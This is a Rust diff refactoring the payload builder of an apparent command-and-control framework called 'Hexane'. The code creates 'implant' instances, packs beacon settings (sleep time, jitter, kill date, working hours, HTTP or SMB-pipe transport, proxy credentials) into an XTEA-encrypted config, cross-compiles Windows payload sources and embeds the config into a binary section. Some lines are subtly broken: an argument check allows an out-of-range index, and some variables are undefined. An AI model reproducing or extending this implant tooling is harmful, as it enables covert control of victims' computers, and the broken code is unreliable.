@@ -1,31 +1,28 @@
-use std::{env, fs};
 use rand::Rng;
+use std::{env, fs};
 use std::str::FromStr;
-use std::borrow::Borrow;
 use std::collections::HashMap;
 use std::path::Path;
 use std::sync::{Arc, Mutex};
 use std::sync::mpsc::channel;
 
 use rayon::prelude::*;
-use crate::server::rstatic::{CURDIR, DEBUG_FLAGS, HASHES, INSTANCES, RELEASE_FLAGS, SESSION, STRINGS};
+use crate::server::rstatic::{DEBUG_FLAGS, HASHES, INSTANCES, RELEASE_FLAGS, SESSION, STRINGS, USERAGENT};
 use crate::server::types::{NetworkType, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData};
 use crate::server::utils::{create_directory, generate_definitions, generate_hashes, normalize_path, canonical_path_all, run_command, source_to_outpath, wrap_message};
 use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::binary::embed_section_data;
 use crate::server::error::{Error, Result};
 use crate::server::stream::Stream;
-use crate::{return_error, length_check_defer};
-
+use crate::{assert_result};
 
 fn map_config(file_path: &String) -> Result<Hexane> {
-    let json_file   = CURDIR.join("json").join(file_path);
-
+    let json_file   = env::current_dir()?.join("json").join(file_path);
     let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;
-    let json_data   = serde_json::from_str::<JsonData>(contents.as_str())?;
+    let json_data   = serde_json::from_str::<JsonData>(&contents)?;
 
     let mut instance    = Hexane::default();
-    let session         = SESSION.lock().unwrap();
+    let session         = SESSION.lock()?;
 
     instance.group_id       = 0;
     instance.main           = json_data.config;
@@ -38,54 +35,47 @@ fn map_config(file_path: &String) -> Result<Hexane> {
 }
 
 pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
-    length_check_defer!(args, 3);
-
-    let mut instance = match map_config(&args[2]) {
-        Ok(instance)    => instance,
-        Err(e)          => return Err(e)
-    };
-
-    match instance.setup_instance() {
-        Ok(_)   => { },
-        Err(e)  => return_error!("load_instance::{e}")
+    if args.len() < 2 {
+        return Err(Error::Custom("invalid arguments".to_string()))
     }
 
-    let ref session = SESSION.lock().unwrap();
+    let mut instance = map_config(&args[2])?;
+
+    instance.setup_instance()?;
+    let session = SESSION.lock()?;
 
     instance.user_session.username = session.username.clone();
     instance.user_session.is_admin = session.is_admin.clone();
 
     wrap_message("info", &format!("{} is ready", instance.builder.output_name));
-    INSTANCES.lock().unwrap().push(instance);
+    INSTANCES.lock()?.push(instance);
 
     // todo: insert db
-
     Ok(())
 }
 
 pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
-    length_check_defer!(args, 3);
     // todo: remove from db
+    if args.len() < 2 {
+        return Err(Error::Custom("invalid arguments".to_string()))
+    }
 
-    let mut instances   = INSTANCES.lock().unwrap();
-    if let Some(pos)    = instances.iter().position(|instance| instance.builder.output_name == args[2]) {
+    let mut instances = INSTANCES.lock()?;
 
+    if let Some(pos) = instances.iter().position(|instance| instance.builder.output_name == args[2]) {
         wrap_message("info", &format!("removing {}", instances[pos].builder.output_name));
         instances.remove(pos);
 
         Ok(())
-    }
-    else {
-        return_error!("Implant not found")
+    } else {
+        Err(Error::Custom("Implant not found".to_string()))
     }
 }
-
 
 pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
-    // todo:: implement
+    // todo: implement
     Ok(())
 }
-
 
 #[derive(Debug, Default)]
 pub struct Hexane {
@@ -93,68 +83,48 @@ pub struct Hexane {
     pub(crate) peer_id:         u32,
     pub(crate) group_id:        u32,
     pub(crate) build_type:      u32,
-
     pub(crate) crypt_key:       Vec<u8>,
     pub(crate) shellcode:       Vec<u8>,
     pub(crate) config_data:     Vec<u8>,
     pub(crate) active:          bool,
-
     pub(crate) main:            Config,
     pub(crate) builder:         Builder,
     pub(crate) compiler:        Compiler,
-    pub(crate) network:         Option<Network>, // says "optional" but is checked for in config
+    pub(crate) network:         Option<Network>, // says "optional" but is checked for in the config
     pub(crate) loader:          Option<Loader>,
     pub(crate) user_session:    UserSession,
 }
-impl Hexane {
-    // todo: add config db write/delete
 
+impl Hexane {
     fn setup_instance(&mut self) -> Result<()> {
         let mut rng = rand::thread_rng();
 
-        self.compiler.build_directory = format!("./payload/{}", self.builder.output_name);
-        self.peer_id    = rng.random::<u32>();
-        self.group_id   = 0;
+        self.compiler.build_directory   = format!("./payload/{}", self.builder.output_name);
+        self.peer_id                    = rng.gen::<u32>();
+        self.group_id                   = 0;
 
-        if self.main.debug {
-            self.compiler.compiler_flags = DEBUG_FLAGS.parse().unwrap();
-        }
-        else {
-            self.compiler.compiler_flags = RELEASE_FLAGS.parse().unwrap();
-        }
+        self.compiler.compiler_flags = if self.main.debug {
+            DEBUG_FLAGS.parse().unwrap()
+        } else {
+            RELEASE_FLAGS.parse().unwrap()
+        };
 
-        match create_directory(&self.compiler.build_directory) {
-            Ok(_)   => wrap_message("debug", &"created build directory".to_owned()),
-            Err(e)  => return_error!("setup_instance::{e}")
-        }
+        assert_result!(create_directory(&self.compiler.build_directory), "setup_instance");
+        assert_result!(generate_hashes(STRINGS, HASHES), "setup_instance");
 
-        match self.generate_config_bytes() {
-            Ok(_)   => wrap_message("debug", &"config data generated".to_owned()),
-            Err(e)  => return_error!("setup_instance::{e}")
-        }
-
-        match generate_hashes(STRINGS, HASHES) {
-            Ok(_)   => wrap_message("debug", &"generated string hashes".to_owned()),
-            Err(e)  => return_error!("setup_instance::{e}")
-        }
-
-        match self.compile_sources() {
-            Ok(_)   => wrap_message("debug", &"generated payload".to_owned()),
-            Err(e)  => return_error!("setup_instance::{e}")
-        }
+        assert_result!(self.generate_config_bytes(), "setup_instance");
+        assert_result!(self.compile_sources(), "setup_instance");
 
         Ok(())
     }
 
     fn generate_config_bytes(&mut self) -> Result<()> {
-        self.crypt_key  = crypt_create_key(16);
+        self.crypt_key = crypt_create_key(16);
 
-        let mut patch = match self.create_binary_patch() {
-            Ok(patch)   => patch,
-            Err(e)      => return_error!("generate_config_bytes::{e}"),
-        };
+        let mut patch   = assert_result!(self.create_binary_patch(), "generate_config_bytes");
+        let encrypt     = self.main.encrypt;
 
-        if self.main.encrypt {
+        if encrypt {
             let patch_cpy   = patch.clone();
             patch           = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
         }
@@ -170,34 +140,27 @@ impl Hexane {
             for module in modules {
                 stream.pack_string(module);
             }
-        }
-        else {
+        } else {
             wrap_message("debug", &"no external module names found. continue.".to_owned());
         }
 
         let working_hours = if let Some(ref hours) = self.main.working_hours {
-            match i32::from_str(hours) {
-                Ok(hours)   => hours,
-                Err(e)      => return_error!("create_binary_patch::{e}")
-            }
-        }
-        else { 0 };
+            i32::from_str(hours).map_err(|e| Error::Custom(format!("create_binary_patch::{e}")))?
+        } else {
+            0
+        };
 
         let kill_date = if let Some(ref date) = self.main.killdate {
-            match i64::from_str(date) {
-                Ok(date)    => date,
-                Err(e)      => return_error!("create_binary_patch::{e}")
-            }
-        }
-        else { 0 };
+            i64::from_str(date).map_err(|e| Error::Custom(format!("create_binary_patch::{e}")))?
+        } else {
+            0
+        };
 
         stream.pack_bytes(&self.crypt_key);
         stream.pack_string(&self.main.hostname);
-
         stream.pack_dword(self.peer_id);
         stream.pack_dword(self.main.sleeptime);
         stream.pack_dword(self.main.jitter as u32);
-
         stream.pack_int32(working_hours);
         stream.pack_dword64(kill_date);
 
@@ -205,7 +168,9 @@ impl Hexane {
             match (&network.r#type, &network.options) {
 
                 (NetworkType::Http, NetworkOptions::Http(ref http)) => {
-                    stream.pack_wstring(http.useragent.as_ref().unwrap());
+                    let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);
+
+                    stream.pack_wstring(useragent);
                     stream.pack_wstring(&http.address);
                     stream.pack_dword(http.port as u32);
                     stream.pack_dword(http.endpoints.len() as u32);
@@ -213,28 +178,25 @@ impl Hexane {
                     for endpoint in &http.endpoints {
                         stream.pack_wstring(endpoint);
                     }
-
-                    if http.domain.is_some() {
-                        stream.pack_string(http.domain.as_ref().unwrap().as_str());
+                    if let Some(ref domain) = http.domain {
+                        stream.pack_string(domain);
                     }
-
-                    if let Some(ref proxy) = http.proxy { // todo: proxy should not be exclusive to http (socks5, ftp, etc...)
+                    if let Some(ref proxy) = http.proxy {
                         let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
-
                         stream.pack_dword(1);
                         stream.pack_wstring(&proxy_url);
                         stream.pack_wstring(proxy.username.as_ref().unwrap());
                         stream.pack_wstring(proxy.password.as_ref().unwrap());
-                    }
-                    else {
+                    } else {
                         stream.pack_dword(0);
                     }
-                },
+                }
+
                 (NetworkType::Smb, NetworkOptions::Smb(ref smb)) => {
                     stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
-                },
+                }
 
-                _ => return_error!("create_binary_patch: unknown network type")
+                _ => return Err(Error::Custom("create_binary_patch: unknown network type".to_string())),
             }
         }
 
@@ -242,34 +204,32 @@ impl Hexane {
     }
 
     fn compile_object(&mut self, mut command: String, source: String, mut flags: String) -> Result<()> {
-
-        let build       = match source_to_outpath(source, &self.compiler.build_directory).map_err(|e| return_error!("compile_object::{e}"))
-        let mut defs    = HashMap::new();
+        let build = assert_result!(source_to_outpath(source, &self.compiler.build_directory), "compile_object");
+        let mut defs: HashMap<String, Option<u32>> = HashMap::new();
 
         if command.trim() != "ld" && command.trim() != "nasm" {
-
-            let encrypted   = self.main.encrypt.ok_or_else(|| return_error!("bool encryption value not specified"));
-            let cfg_size    = self.main.config_size.ok_or_else(|| return_error!("config size not specified"));
+            let encrypted   = self.main.encrypt;
+            let cfg_size    = self.main.config_size;
 
             if self.main.debug {
                 defs.insert("DEBUG".to_string(), None);
             }
 
-            defs.insert("CONFIG_SIZE".to_string(), Some(cfg_size as u32));
-            defs.insert("ENCRYPTED".to_string(), Some(if encrypted {1u32} else {0u32}));
-            defs.insert("BSWAP".to_string(),    Some(if &self.main.architecture == "amd64" {0u32} else {1u32}));
+            defs.insert("CONFIG_SIZE".to_string(),  Some(cfg_size));
+            defs.insert("ENCRYPTED".to_string(),    Some(if encrypted { 1u32 } else { 0u32 }));
+            defs.insert("BSWAP".to_string(),        Some(if &self.main.architecture == "amd64" { 0u32 } else { 1u32 }));
 
             if let Some(network) = &self.network {
                 match network.r#type {
-                    NetworkType::Http   => { defs.insert("TRANSPORT_HTTP".to_string(), None); }
-                    NetworkType::Smb    => { defs.insert("TRANSPORT_PIPE".to_string(), None); }
+                    NetworkType::Http =>    { defs.insert("TRANSPORT_HTTP".to_string(), None); }
+                    NetworkType::Smb =>     { defs.insert("TRANSPORT_PIPE".to_string(), None); }
                 }
             }
         }
 
-        command.push_str(&generate_definitions(&defs));
-
         let curdir = env::current_dir()?.canonicalize()?;
+
+        command.push_str(&generate_definitions(defs));
         flags.push_str(&format!(" -I{} ", normalize_path(curdir.to_str().unwrap())));
         flags.push_str(&format!(" -o {} ", build));
 
@@ -281,13 +241,11 @@ impl Hexane {
         let src_path        = Path::new(&self.builder.root_directory).join("src");
         let mut components  = self.compiler.components.clone();
 
-        let entries = match canonical_path_all(src_path) {
-            Ok(entries) => entries,
-            Err(e)      => return_error!("compile_sources::read_canonical_path::{e}")
-        };
+        let entries = assert_result!(canonical_path_all(src_path), "compile_sources");
 
         let (err_send, err_recv)    = channel();
         let atoms                   = Arc::new(Mutex::new(()));
+
 
         entries.iter().for_each(|absolute_path| {
             if !absolute_path.is_file() {
@@ -304,53 +262,45 @@ impl Hexane {
             let err_handle  = err_send.clone();
             let _guard      = atoms_clone.lock().unwrap();
 
-            let absolute_str = match absolute_path.to_str() {
-                Some(path_str)  => { normalize_path(path_str) }
-                None            => { Err("compile_sources: cannot convert path to string").unwrap() }
-            };
+            let absolute_str = normalize_path(absolute_path.to_str().unwrap());
 
             match absolute_path.extension().and_then(|ext| ext.to_str()) {
-                Some("asm") => {
 
+                Some("asm") => {
                     command.push_str("nasm");
                     flags = " -f win64 ".to_string();
                     flags.push_str(&absolute_str);
                 }
 
                 Some("cpp") => {
-
                     command.push_str("x86_64-w64-mingw32-g++");
                     flags.push_str(" -c ");
                     flags.push_str(&absolute_str);
-
                     flags.push_str(" ");
                     flags.push_str(compile.as_str());
                 }
 
-                _ => { return; }
+                _ => {
+                    return;
+                }
             }
 
             if let Err(e) = self.compile_object(command, absolute_str.clone(), flags) {
                 err_handle.send(e).unwrap();
-            }
-            else {
+            } else {
                 components.push(output);
             }
         });
 
         if let Ok(e) = err_recv.try_recv() {
-            return_error!("compile_sources::{e}");
+            return Err(Error::Custom(format!("compile_sources::{e}")));
         }
 
         wrap_message("debug", &"Linking final objects".to_owned());
-        match embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice()) {
-            Ok(_)   => { },
-            Err(e)  => return_error!("compile_sources::{e}")
-        }
+        assert_result!(embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice()), "compile_sources");
 
         // TODO: link all objects
 
         Ok(())
     }
 }
-
